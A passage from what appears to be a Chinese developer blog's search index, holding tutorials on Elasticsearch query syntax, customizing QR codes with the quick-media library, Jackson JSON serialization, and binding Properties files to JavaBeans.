\"match_all\": { } }} 2.2 term精确匹配根据field进行value匹配，忽略大小写; 查询语法，形如: `{“query”: {“term”: {“成员名”: {“value”: “查询值”}}}} query, term, value 三个key为固定值 成员名: 为待查询的成员 查询值: 需要匹配的值 (说明：后面语法中，中文的都是需要替换的，英文的为固定值) 12345678910GET first-index/_search{ \"query\": { \"term\": { \"user.id\": { \"value\": \"yihui\" } } }} 当value不匹配，或者查询的field不存在，则查不到的对应的信息，如 2.3 terms 多值匹配term表示value的精确匹配，如果我希望类似value in (xxx)的查询，则可以使用terms 语法: 1234567{ \"query\": { \"terms\": { \"成员名\": [成员值, 成员值] } }} 实例如 12345678GET first-index/_search{ \"query\": { \"terms\": { \"user.id\": [\"yihui\", \"erhui\"] } }} 2.4 range 范围匹配适用于数值、日期的比较查询，如常见的 &gt;, &gt;=, &lt;, &lt;= 查询语法 12345678910{ \"query\": { \"range\": { \"成员名\": { \"gte\": \"查询下界\" , \"lte\": \"查询下界\" } } }} 范围操作符 说明 gt 大于 &gt; gte 大于等于 &gt;= lt 小于 &lt; lte 小于等于 &lt;= 实例如下 1234567891011GET first-index/_search{ \"query\": { \"range\": { \"age\": { \"gte\": 10, \"lte\": 18 } } }} 2.5 字段过滤根据是否包含某个字段来查询， 主要有两个 exists 表示要求存在， missing表示要求不存在 查询语法 1234567{ \"query\": { \"exists/missing\": { \"field\": \"字段值\" } }} 实例如下 12345678GET first-index/_search{ \"query\": { \"exists\": { \"field\": \"age\" } }} 2.6 组合查询上面都是单个查询条件，单我们需要多个查询条件组合使用时，可以使用bool + must/must_not/should来实现 查询语法 12345678910111213141516{ \"query\": { \"bool\": { \"must\": [ # 相当于and查询 \"查询条件1\", \"查询条件2\" ], \"must_not\": [ # 多个查询条件相反匹配，相当与not ... ], \"should\": [ # 有一个匹配即可， 相当于or ... ] } }} 实例如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374## user.id = yihui and age &lt; 20GET first-index/_search{ \"query\": { \"bool\": { \"must\": [ { \"term\": { \"user.id\": { \"value\": \"yihui\" } } }, { \"range\": { \"age\": { \"lt\": 20 } } } ] } }}# !(user.id) = yihui and !(age&gt;20)GET first-index/_search{ \"query\": { \"bool\": { \"must_not\": [ { \"term\": { \"user.id\": { \"value\": \"yihui\" } } }, { \"range\": { \"age\": { \"gt\": 20 } } } ] } }}# user.id = 'yihui' or age&gt;20GET first-index/_search{ \"query\": { \"bool\": { \"should\": [ { \"term\": { \"user.id\": { \"value\": \"yihui\" } } }, { \"range\": { \"age\": { \"gt\": 20 } } } ] } }} 下面截图以 must_not 输出示意 说明 前面根据字段查询 existing 只能单个匹配，可以借助这里的组合来实现多个的判断 2.7 match查询最大的特点是它更适用于模糊查询，比如查询某个field中的字段匹配 语法 1234567{ \"query\": { \"match\": { \"字段名\": \"查询值\" } }} 举例说明 12345678GET first-index/_search{ \"query\": { \"match\": { \"user.name\": \"灰og\" } }} 说明，如果有精确查询的需求，使用前面的term，可以缓存结果 2.8 multi_match查询 更多相关信息，可以查看: 官网-multi_match查询 多个字段中进行查询 语法 type: best_fields 、 most_fields 和 cross_fields （最佳字段、多数字段、跨字段） 最佳字段 ：当搜索词语具体概念的时候，比如 “brown fox” ，词组比各自独立的单词更有意义 多数字段：为了对相关度进行微调，常用的一个技术就是将相同的数据索引到不同的字段，它们各自具有独立的分析链。 混合字段：对于某些实体，我们需要在多个字段中确定其信息，单个字段都只能作为整体的一部分 1234567891011{ \"query\": { \"multi_match\": { \"query\": \"Quick brown fox\", \"type\": \"best_fields\", \"fields\": [ \"title\", \"body\" ], \"tie_breaker\": 0.3, \"minimum_should_match\": \"30%\" } }} 实例演示 123456789GET first-index/_search{ \"query\": { \"multi_match\": { \"query\": \"汉\", \"fields\": [\"user.id\", \"addr.city\"] } }} 上面除了写上精确的字段之外，还支持模糊匹配，比如所有字段中进行匹配 123456789GET first-index/_search{ \"query\": { \"multi_match\": { \"query\": \"blog\", \"fields\": [\"*\"] } }} 2.9 wildcard查询shell统配符 ?: 0/1个字符 *: 0/n个字符 12345678910GET first-index/_search{ &quot;query&quot;: { &quot;wildcard&quot;: { &quot;user.id&quot;: { &quot;value&quot;: &quot;*Hu?&quot; } } }} 说明，对中文可能有问题 2.10 regexp查询正则匹配 12345678GET first-index/_search{ \"query\": { \"regexp\": { \"user.name\": \".*log\" } }} 2.11 prefix查询前缀匹配 12345678GET first-index/_search{ \"query\": { \"prefix\": { \"user.name\": \"一\" } }} 2.12 排序查询结果排序，根据sort来指定 123456789{ \"sort\": [ { \"成员变量\": { \"order\": \"desc\" } } ]} 实例如下 12345678910111213GET first-index/_search{ \"query\":{ \"match_all\": {} }, \"sort\": [ { \"@timestamp\": { \"order\": \"desc\" } } ]} 2.13 更多更多操作姿势，可以在官方文档上获取 官方教程 3. 删除文档需要根据文档id进行指定删除 1DELETE first-index/_doc/gPYLh3gBF9fSFsHNEe58 删除成功 4.更新文档4.1 覆盖更新使用PUT来实现更新，同样通过id进行 覆盖更新 version版本会+1 如果id对应的文档不存在，则新增 1234PUT first-index/_doc/f_ZFhngBF9fSFsHNte7f{ \"age\": 28} 4.2 增量更新采用POST来实现增量更新 field 存在，则更新 field不存在，则新增 123456POST first-index/_update/gvarh3gBF9fSFsHNuO49{ \"doc\": { \"age\": 25 }} 此外还可以采用script脚本更新 在原来的age基础上 + 5 1234POST first-index/_update/gvarh3gBF9fSFsHNuO49{ \"script\": \"ctx._source.age += 5\"} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/03/31/210331-ElasticSearch-基本使用姿势/"},{"title":"210916-Quick-Media 中秋到了，是时候给你的二维码加个月饼了","text":"又一年的中秋将至，要怎么样才能蹭一波它的热度呢？作为一个coder，是不是可以用代码写首诗？想法是好，可惜难度有点大，那么就简单点，给自己的二维码上，加个月饼吧 1. logo中加月饼？在二维码中添加月饼，好像没啥难度，直接网上搜一个二维码生成器，然后找个月饼图，作为logo拍上去，game over 如果仅限于此的话，本文也就没啥意思了，接下来我们看些不一样的东西 2. 拒绝黑白块，满屏二维码接下来我们使用github上的quick-media:qrcode-plugin来实现更多有意思的二维码定制 首先引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi.media&lt;/groupId&gt; &lt;artifactId&gt;qrcode-plugin&lt;/artifactId&gt; &lt;version&gt;2.6.1&lt;/version&gt;&lt;/dependency&gt; 接下来我们使用三个月饼图，来生成一张满屏皆是月饼的二维码 要生成上面的二维码也很简单，实现代码如下 1234567891011121314151617181920212223242526String sourcePrefix = \"/Users/user/Documents/qr/\";QrCodeGenWrapper.of(msg) .setW(500) .setH(500) .setErrorCorrection(ErrorCorrectionLevel.M) .setDiaphaneityFill(true) // 透明处用背景色填充 .setDrawBgColor(Color.WHITE) .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE_V2) .setImgResourcesForV2(RenderImgResourcesV2.create() // 下面配置 1 x 1的方块对应的月饼图片 .addSource(1, 1).addImg(sourcePrefix + \"00.png\") .addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) // 最后一个1，表示这个月饼只出现一次 .addImg(sourcePrefix + \"03.png\") .build() // 下面配置 2 x 2的方块对应的月饼图片 .addSource(2, 2) .addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() .addSource(3, 3).addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() ) .asFile(sourcePrefix + \"/out0.jpg\"); 上面虽然生成了一个满屏就是月饼的二维码，但识别是个问题，关键点就是三个码眼（探测图形） 3. 码眼也要绚起来既然上面的码眼不够优秀，那就替换掉，用自定义的码眼来代替默认生成的，提高识别率 要实现上面的这个二维码，方法也很简单，在前面的基础上，指定一下探测图形即可 123456// 设置左上角码眼.setLTDetectImg(sourcePrefix + \"d1.jpg\")// 设置左下角码眼.setLDDetectImg(sourcePrefix + \"d2.jpg\")// 设置右上角码眼.setRTDetectImg(sourcePrefix + \"d3.jpg\") 其他的设置方式和前面的也没有什么区别，实现如下 123456789101112131415161718192021222324252627String sourcePrefix = \"/Users/user/Documents/qr/\";QrCodeGenWrapper.of(msg) .setW(500) .setH(500) .setErrorCorrection(ErrorCorrectionLevel.M) .setDiaphaneityFill(true) // 透明处用背景色填充 .setDrawBgColor(Color.WHITE) .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE_V2) .setLTDetectImg(sourcePrefix + \"d1.jpg\") .setLDDetectImg(sourcePrefix + \"d2.jpg\") .setRTDetectImg(sourcePrefix + \"d3.jpg\") .setImgResourcesForV2(RenderImgResourcesV2.create() .addSource(1, 1).addImg(sourcePrefix + \"00.png\") .addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\") .build() .addSource(2, 2) .addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() .addSource(3, 3).addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() ) .asFile(sourcePrefix + \"/out_d0.jpg\"); 4. 印有诗词的二维码既然最开始说了中秋要用代码写诗来蹭热度，虽然写诗我不行，但是作为一个专职ctrl+c/ctrl+v的coder，抄我可会了，接下来我们把苏轼大大的千古名篇，给印在我们的二维码上 上面这个二维码有点意思了，直接用中文来渲染，要实现也很简单，下面几个简单配置即可 12345678910String sourcePrefix = \"/Users/user/Documents/qr/\";QrCodeGenWrapper.of(msg) .setDetectSpecial() // 三个码眼还是用标砖的码眼 .setDrawStyle(QrCodeOptions.DrawStyle.TXT) .setQrText(\"明月几时有把酒问青天不知天上宫阙今夕是何年我欲乘风归去又恐琼楼玉宇高处不胜寒起舞弄清影何似在人间\" + \"转朱阁低绮户照无眠不应有恨何事长向别时圆人有悲欢离合月有阴晴圆缺此事古难全但愿人长久千里共婵娟\") .setLogo(sourcePrefix+\"/logo2.jpg\") // 添加一个logo .setLogoStyle(QrCodeOptions.LogoStyle.ROUND) .setLogoBorderBgColor(Color.GRAY) .asFile(sourcePrefix + \"/ft.jpg\"); 5. 有诗词，也有月饼的二维码只有诗词没有月饼不好看；只有月饼没有诗词不够秀，那就合起来，生成一个类似下面的二维码 需要注意的是，上面的包中，并没有提供这种混编的方式，需要我们拉到源码自定义改造一番，重写QrCodeOption.DrawStyle中的方法 1234567891011121314151617181920212223242526272829303132333435363738394041IMAGE_V2 { @Override public void draw(Graphics2D g2d, int x, int y, int w, int h, BufferedImage img, String txt) { String source = \"明月几时有把酒问青天不知天上宫阙今夕是何年我欲乘风归去又恐琼楼玉宇高处不胜寒起舞弄清影何似在人间\" + \"转朱阁低绮户照无眠不应有恨何事长向别时圆人有悲欢离合月有阴晴圆缺此事古难全但愿人长久千里共婵娟\"; if (\"false\".equals(txt)) { if (Math.random() &lt; 0.8f) { if (Math.random() &lt; 0.6f) { int offsetX = w / 5, offsetY = h / 5; int width = w - offsetX * 2, height = h - offsetY * 2; g2d.fillRect(x + offsetX, y + offsetY, width, height); return; } int index = QuickQrUtil.getIndex(); if (index &gt;= source.length()) { int offsetX = w / 5, offsetY = h / 5; int width = w - offsetX * 2, height = h - offsetY * 2; g2d.fillRect(x + offsetX, y + offsetY, width, height); } else { Font oldFont = g2d.getFont(); if (oldFont.getSize() != w) { Font newFont = QuickQrUtil.font(oldFont.getName(), oldFont.getStyle(), w); g2d.setFont(newFont); } g2d.drawString(source.substring(index, index+1), x, y + w); g2d.setFont(oldFont); } } else { g2d.drawImage(img.getScaledInstance(w, h, Image.SCALE_SMOOTH), x, y, null); } } else { g2d.drawImage(img.getScaledInstance(w, h, Image.SCALE_SMOOTH), x, y, null); } } @Override public boolean expand(DotSize dotSize) { return true; }} 6. 让二维码动起来上面的这些都是静态的，接下来我们赋予它动起来的能力，生成一个gif版的二维码，需要我们做的事情也不多，找个gif背景图即可 上面这个动态二维码的生成方式也很简单，基本配置与前面一致，区别在于指定背景gif图 123456789101112131415161718192021222324252627282930313233343536String sourcePrefix = \"/Users/user/Documents/qr/\";QrCodeGenWrapper.of(msg) .setW(160) .setH(160) .setErrorCorrection(ErrorCorrectionLevel.M) .setDiaphaneityFill(true) // 透明处用背景色填充 .setDrawBgColor(Color.WHITE) .setPadding(0) .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE_V2) .setDetectSpecial() .setImgResourcesForV2(RenderImgResourcesV2.create() .addSource(1, 1).addImg(sourcePrefix + \"00.png\") .addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\") .build() .addSource(2, 2) .addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() .addSource(3, 3).addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() ) .setLogo(sourcePrefix+\"/logo.jpg\") .setLogoRate(12) .setLogoStyle(QrCodeOptions.LogoStyle.ROUND) .setLogoBorderBgColor(Color.GRAY) // 下面是设置背景图，表示将二维码覆盖在背景图的指定坐标上 .setBgImg(sourcePrefix + \"/bg4.gif\") .setBgStyle(QrCodeOptions.BgImgStyle.FILL) .setBgStartX(10) .setBgStartY(120) .asFile(sourcePrefix + \"/out3.gif\");} 除了上面这种动态之外，还可以实现类似logo的动图效果，如 实现姿势也很简单，借助FtImg来指定前置的gif图即可 1234567891011121314151617181920212223242526272829String sourcePrefix = \"/Users/user/Documents/qr/\";QrCodeGenWrapper.of(msg) .setW(500) .setH(500) .setDiaphaneityFill(true) // 透明处用背景色填充 .setDrawBgColor(ColorUtil.OFF_WHITE) // 设置背景色为米黄色，方便gif图的显示效果 .setDrawStyle(QrCodeOptions.DrawStyle.IMAGE_V2) .setDetectSpecial() .setImgResourcesForV2(RenderImgResourcesV2.create() .addSource(1, 1).addImg(sourcePrefix + \"00.png\") .addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\") .build() .addSource(2, 2) .addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() .addSource(3, 3).addImg(sourcePrefix + \"00.png\").addImg(sourcePrefix + \"01.png\") .addImg(sourcePrefix + \"02.png\", 1) .addImg(sourcePrefix + \"03.png\").build() ) // 直接从网络下载gif图，缩放为 112 * 120, 在二维码中间绘制 .setFtImg(\"https://b-ssl.duitang.com/uploads/item/201609/14/20160914224309_WNUaE.gif\") .setFtW(112) .setFtH(120) .setFtStartX(-194) .setFtStartY(-190) .asFile(sourcePrefix + \"/out_ft1.gif\"); 7. 最后的最后最后声明，本文中所有资源来自网络，如有侵权，联系即删，本文中所有的二维码生成，都是基于开源项目quick-media来生成的， 有兴趣的小伙伴可以尝鲜一下https://github.com/liuyueyi/quick-media，毕竟月饼节到了，怎么着也得吃个吧 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/09/16/210916-Quick-Media-中秋到了，是时候给你的二维码加个月饼了/"},{"title":"210807-Jackson 实用姿势小结","text":"使用json进行数据交互可以说是非常常见的常见，在java侧，常用的json解析框架也不少，比如gson, fastjson以及spring mvc中默认使用的jackson；本文将主要介绍一下jackson的基本使用姿势，比如常见的 普通对象转json字符串 json字符串转POJO，转Map/List 泛型支持 驼峰/下划线互转，自定义映射关系 1. 项目依赖使用maven来构建项目，需要使用Jackson进行序列化操作，核心引入下面的包 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.12.4&lt;/version&gt;&lt;/dependency&gt; 2. 基本使用姿势在Jackson中，若希望实现序列化/反序列化，都离不开ObjectMapper 比如将对象转Json String 1234567public static &lt;T&gt; String encode(T obj) { try { return new ObjectMapper().writeValueAsString(obj); } catch (Exception e) { throw new UnsupportedOperationException(e); }} 反序列化 1234567public static &lt;T&gt; T decode(String str, Class&lt;T&gt; clz) { try { return new ObjectMapper().readValue(str, clz); } catch (Exception e) { throw new UnsupportedOperationException(e); }} 注意 jackson与gson/fastjson的一个显著区别在于它的序列化/反序列化有声明异常，使用时需要声明或者主动catch（这一点感觉不太友好） 其次，不推荐每次都创建一个ObjectMapper对象，可以考虑复用 3. 泛型反序列化对于泛型的反序列化，直接使用上面，传入一个class对象，并不能很好的工作，和Gson/FastJson一样，Jackson也支持根据Type来返序列化 1234567public static &lt;T&gt; T decode(String str, Type type) { try { return objectMapper.readValue(str, objectMapper.getTypeFactory().constructType(type)); } catch (Exception e) { throw new UnsupportedOperationException(e); }} 重点关注上面的传参，通过objectMapper.getTypeFactory().constructType(type)来创建需要的JavaType对象 一个demo使用姿势如下 123GenericBean&lt;Map&gt; gbean2 = JacksonUtil.decode(str, new com.fasterxml.jackson.core.type .TypeReference&lt;GenericBean&lt;Map&gt;&gt;() {}.getType());System.out.println(gbean2); 4. 转Map/List转普通的Map/List没有什么特殊的 123456789101112131415public static Map toMap(String str) { try { return objectMapper.readValue(str, Map.class); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }}public static List toList(String str) { try { return objectMapper.readValue(str, List.class); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }} 5. JsonNodeJsonNode为Jackson定义的节点对象，有些类似Gson的JsonObject/JsonArray 和 FastJson的JSONObject/JSONArray，使用它可以更友好的操作json对象（当然更推荐的是直接转JAVA bean） 1234567public static JsonNode toObj(String str) { try { return objectMapper.readTree(str); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }} 使用demo如下 123String str = \"{\\\"userId\\\":12,\\\"userName\\\":\\\"yh\\\",\\\"userMoney\\\":12.3,\\\"userSkills\\\":[\\\"1\\\",\\\"2\\\",\\\"3\\\"],\\\"extra\\\":{\\\"a\\\":\\\"123\\\",\\\"b\\\":345,\\\"c\\\":[\\\"1\\\",\\\"2\\\",\\\"3\\\"],\\\"d\\\":35.1},\\\"hello\\\":\\\"你好\\\"}\";JsonNode bean = JacksonUtil.toObj(str);int userId = bean.get(\"userId\").asInt(); 6. 驼峰与下划线常见的一个case，json字符串key为下划线，Java bean为驼峰命名，针对这种场景，jackson可以很方便的支持 123456789101112131415161718192021222324252627282930/** * 驼峰转下换线 * * @param obj * @return */public static String toUnderStr(Object obj) { ObjectMapper objectMapper = new ObjectMapper(); // 驼峰转下划线 objectMapper.setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE); try { return objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(obj); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }}/** * 下划线格式json串，转驼峰格式的Java bean */ public static &lt;T&gt; T fromUnderStr(String str, Class&lt;T&gt; clz) { ObjectMapper objectMapper = new ObjectMapper(); // 驼峰转下划线 objectMapper.setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE); try { return objectMapper.readValue(str, clz); } catch (JsonProcessingException e) { throw new UnsupportedOperationException(e); }} 从上面的代码也可以看出，驼峰与下划线的互转支持，主要是通过设置PropertyNamingStrategies来实现的，在jackson中，支持下面几种配置 LOWER_CAMEL_CASE UPPER_CAMEL_CASE SNAKE_CASE LOWER_CASE KEBAB_CASE LOWER_DOT_CASE 使用上面这种方式适用于全局的下划线与驼峰的转换方式，如果我只希望针对单独某个类进行这样的设置呢？ 可以借助注解@JsonNaming来实现 12345678910@JsonNaming(PropertyNamingStrategies.SnakeCaseStrategy.class)public class SimpleBean implements Serializable { private static final long serialVersionUID = -9111747337710917591L; private Integer userId; private String userName; private double userMoney;} 上面这个case中，如果我们将SimpleBean对象序列化为json串，即便调用的是前面最基础的使用姿势 new ObjectMapper().writeValueAsString(simpleBean)，输出的也是下划线格式的json串；同理反序列化时，也是将下划线转为驼峰 7. 字段别名上面介绍的是驼峰与下划线命名方式，当然也会有一些其他特殊的场景，针对某个字段进行别名设置，可以通过注解@JsonProperties来标注 12@JsonProperty(\"user\")private String userName; 上面这个表示序列化为json字符串时，userName对应的key为user 8. 字段忽略在序列化时，难免会遇到某些字段不进行序列化/反序列化的场景，这里有两种常用的方式 8.1 @JsonIgnore注解直接在希望忽略的字段上添加注解@JsonIgnore即可，如 123456@Datapublic class SimpleBean implements Serializable { private static final long serialVersionUID = -9111747337710917591L; @JsonIgnore private SimpleBean self;} 8.2 transient关键字除了使用上面的注解之外，也可以使用jdk原生提供的关键字transient来声明需要忽略的字段 1private transient SimpleBean self; 重点注意： 在jackson中，默认的场景下，即便字段上修饰有transient关键字，也不会忽略还需要如下处理 1234567891011objectMapper = new ObjectMapper();// 忽略 transient 关键字的配置// case1objectMapper.configure(MapperFeature.PROPAGATE_TRANSIENT_MARKER, true);// case2objectMapper.setVisibility(objectMapper.getSerializationConfig() .getDefaultVisibilityChecker() .withFieldVisibility(JsonAutoDetect.Visibility.ANY) .withGetterVisibility(JsonAutoDetect.Visibility.NONE) .withIsGetterVisibility(JsonAutoDetect.Visibility.NONE)); 上面两种方式，都可以实现忽略transient关键字修饰的对象序列化 9. Java Bean约定9.1 get/set方法必须有Java Bean的get/set方法必须存在，否则额序列化与反序列化只会处理public修饰的成员 123456789public class SimpleBean { private String name; private Long userId; public String desc = \"hello world\"; public SimpleBean() { name = \"yhh\"; userId = 10L; }} 序列化后输出为 {&quot;desc&quot;:&quot;hello world&quot;}； 反序列化也不会更新 name, userId； 特别的，当Java Bean对象，所有的成员都是private，又没有get方法时，在序列化时，会抛异常，提示信息如下 1No serializer found for class com.git.hui.spring.json.bean.SimpleBean and no properties discovered to create BeanSerializer (to avoid exception, disable SerializationFeature.FAIL_ON_EMPTY_BEANS) 9.2 无参构造函数必须有如果java bean没有默认无参构造方法，那么在反序列化时，会抛出异常，无法实例化 一个如下的异常提示信息 1Cannot construct instance of `com.git.hui.spring.json.bean.SimpleBean` (although at least one Creator exists): cannot deserialize from Object value (no delegate- or property-based Creator) 10. Json串存在Bean未定义字段忽略设置默认的使用姿势下，若json串中存在一个bean未定义的kv，会抛异常，一个示例如下 1Unrecognized field &quot;xxx&quot; (class com.git.hui.spring.json.bean.GenericBean), not marked as ignorable 如果希望忽略这种场景，那么就需要禁用FAIL_ON_UNKNOWN_PROPERTIES配置 12new ObjectMapper().disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES) .readValue(str, Xxx.class) 扩展知识点 对于Spring MVC而言，默认使用的是Jackson序列化框架，如果我们定义接收参数为json串，那么当前端传参多了一个未定义的字段，会直接抛异常么？ 11. 序列化输出时忽略null默认场景下，将一个bean对象序列化为json串，即便成员变量为null，也会输出，如下 1234567{ \"userId\" : null, \"userName\" : null, \"userMoney\" : 0.0, \"userSkills\" : null, \"extra\" : null} 这种case某些场景下是合适的，比如生成接口文档示例时，更关心的是参数说明，即便为null，也是希望有这个；但是另外一些场景下则希望忽略，毕竟可以节省对象大小 需要忽略null字段时，可以如下设置 12new ObjectMapper().setSerializationInclusion(JsonInclude.Include.NON_NULL) .writerWithDefaultPrettyPrinter().writeValueAsString(xxx) 关键点就是配置 setSerializationInclusion(JsonInclude.Include.NON_NULL) 12. key为null场景兼容对于普通的Java bean而言，不存在key为null的场景，但是如果是将一个Map对象，输出为json串时，那么就可能出现这种场景了，如 123Map&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put(null, \"123\");new ObjectMapper().writeValueAsString(map); 上面这个执行，直接抛异常 1Null key for a Map not allowed in JSON (use a converting NullKeySerializer?) 如果希望兼容这个场景，则可以如下处理 1234567ObjectMapper objectMapper = new ObjectMapper();objectMapper.getSerializerProvider().setNullKeySerializer(new JsonSerializer&lt;Object&gt;() { @Override public void serialize(Object value, JsonGenerator gen, SerializerProvider serializers) throws IOException { gen.writeFieldName(\"null\"); }}); 上面这个做法，就是将key为null的，以null字符串来替代 说明 既然key可能为null，当然也为其他类型，但是在序列化输出时，会转String 如下面这个case 123Map map = new HashMap();map.put(new ArrayList&lt;&gt;(), 123);new ObjectMapper().writeValueAsString(map); 输出的字符串为 1{\"[]\":123} 13 其他以上的知识点，基本上可以覆盖我们日常在使用Jackson进行序列化和反序列化中95%的场景，至于其他的比如自定义Name策略，反序列化的默认值类型，类型转换，json注释的支持与否等相对少见的姿势，看后续是否有空补上 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/08/07/210807-Jackson-实用姿势小结/"},{"title":"210902-实战小技巧16：Properties配置文件自动装载JavaBean","text":"每天一个实战小技巧，Properties配置文件自动装载JavaBean SpringBoot的配置自动装载，使用起来还是很舒爽的，可以非常简单的将properties配置文件的内容，填充到Java bean对象中，如果我们现在是一个脱离于Springboot框架的项目，想实现上面这个功能，可以怎么来做呢？ 1. 配置文件自动装载前面介绍了Properties文件的读取以及基本使用姿势，通过上篇博文已知Properties类的本质是一个Map，所以我们需要干的就是将Map容器的值，赋值到JavaBean的成员属性中 要实现这个功能，自然而然会想到的就是利用反射（考虑到我们赋值的通常为标准的java bean，使用内省是个更好的选择） 接下来我们需要实现的也比较清晰了，第一步获取成员属性，两种方式 内省: BeanInfo bean = Introspector.getBeanInfo(clz); PropertyDescriptor[] propertyDescriptors = bean.getPropertyDescriptors(); 反射: Field[] fields = clz.getDeclaredFields(); 第二步遍历成员属性，进行赋值 内省：借助前面获取的PropertyDescriptor对象，拿到set方法，进行赋值 descriptor.getWriteMethod().invoke(obj, value) 反射：适应Field.set来赋值 field.set(obj, value); 注意 上面的两种赋值方式，都要求我们传入的value对象类型与定义类型一直，否则会抛类型转换异常 为了避免复杂的类型转换与判定，我们这里介绍下apache的commons-beanutils来实现属性拷贝 123456&lt;!-- https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-beanutils&lt;/groupId&gt; &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt; &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt; 接下来核心的实现逻辑如下 1234567891011121314151617181920212223242526272829303132333435363738394041private static boolean isPrimitive(Class clz) { if (clz.isPrimitive()) { return true; } try { return ((Class) clz.getField(\"TYPE\").get(null)).isPrimitive(); } catch (Exception e) { return false; }}public static &lt;T&gt; T toBean(Properties properties, Class&lt;T&gt; type, String prefix) throws IntrospectionException, IllegalAccessException, InstantiationException, InvocationTargetException { if (prefix == null) { prefix = \"\"; } else if (!prefix.isEmpty() &amp;&amp; !prefix.endsWith(\".\")) { prefix += \".\"; } type.getDeclaredFields(); // 内省方式来初始化 T obj = type.newInstance(); BeanInfo bean = Introspector.getBeanInfo(type); PropertyDescriptor[] propertyDescriptors = bean.getPropertyDescriptors(); for (PropertyDescriptor descriptor : propertyDescriptors) { // 只支持基本数据类型的拷贝 Class fieldType = descriptor.getPropertyType(); if (fieldType == Class.class) { continue; } if (isPrimitive(fieldType) || fieldType == String.class) { // 支持基本类型的转换，如果使用 PropertyUtils, 则不会实现基本类型 + String的自动转换 BeanUtils.setProperty(obj, descriptor.getName(), properties.getProperty(prefix + descriptor.getName())); } else { BeanUtils.setProperty(obj, descriptor.getName(), toBean(properties, fieldType, prefix + descriptor.getName())); } } return obj;} 注意上面的实现，首先通过内省的方式获取所有的成员，然后进行遍历，借助BeanUtils.setProperty来实现属性值设置 这里面有两个知识点 BeanUtil 还是 PropertyUtil 它们两都有个设置属性的方法，但是BeanUtil支持简单类型的自动转换；而后者不行，要求类型完全一致 非简单类型 对于非简单类型，上面采用了递归的调用方式来处理；请注意，这里并不完善，比如BigDecimal, Date, List, Map这些相对基础的类型，是不太适用的哦 2. 功能测试最后针对上面的实现功能，简单的测试一下，是否可行 配置文件mail.properties 1234567mail.host=localhostmail.port=25mail.smtp.auth=falsemail.smtp.starttlsEnable=falsemail.from=test@yhhblog.commail.username=usermail.password=pwd 两个Java Bean 123456789101112131415@Datapublic static class MailProperties { private String host; private Integer port; private Smtp smtp; private String from; private String username; private String password;}@Datapublic static class Smtp { private String auth; private String starttlsEnable;} 转换测试类 123456789101112public static Properties loadProperties(String propertyFile) throws IOException { Properties config = new Properties(); config.load(PropertiesUtil.class.getClassLoader().getResourceAsStream(propertyFile)); return config;}@Testpublic void testParse() throws Exception { Properties properties = loadProperties(\"mail.properties\"); MailProperties mailProperties = toBean(properties, MailProperties.class, 